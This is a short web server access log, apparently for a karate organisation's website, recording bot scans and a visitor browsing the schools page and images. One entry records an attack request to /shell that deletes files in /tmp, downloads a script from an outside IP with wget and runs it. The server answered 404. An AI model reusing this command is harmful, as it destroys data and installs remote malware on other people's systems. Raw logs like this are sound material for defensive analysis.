::ffff:52.59.189.168 - - [09/Jul/2023:00:13:06 +0000] "GET / HTTP/1.1" 200 60511 "-" "webprosbot/2.0 (+mailto:abuse-6337@webpros.com)"
::ffff:197.37.90.147 - - [09/Jul/2023:00:19:30 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+141.98.6.123/sensi.sh;sh+/tmp/sensi.sh HTTP/1.1" 404 144 "-" "Hello, world"
::ffff:5.161.191.237 - - [09/Jul/2023:00:22:52 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"
::ffff:154.202.107.128 - - [09/Jul/2023:00:30:12 +0000] "HEAD / HTTP/1.1" 200 60511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
::ffff:154.202.107.128 - - [09/Jul/2023:00:30:12 +0000] "HEAD / HTTP/1.1" 200 60511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
::ffff:205.210.31.161 - - [09/Jul/2023:00:41:02 +0000] "GET / HTTP/1.0" 200 60511 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:184.23.248.166 - - [09/Jul/2023:00:46:41 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:184.23.248.166 - - [09/Jul/2023:00:46:41 +0000] "GET /schools HTTP/1.1" 200 97308 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:184.23.248.166 - - [09/Jul/2023:00:46:41 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 200 86185 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:184.23.248.166 - - [09/Jul/2023:00:46:41 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:184.23.248.166 - - [09/Jul/2023:00:46:41 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:184.23.248.166 - - [09/Jul/2023:00:46:41 +0000] "GET /images/instructors/JohnPWKK.jpg HTTP/1.1" 200 7574 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
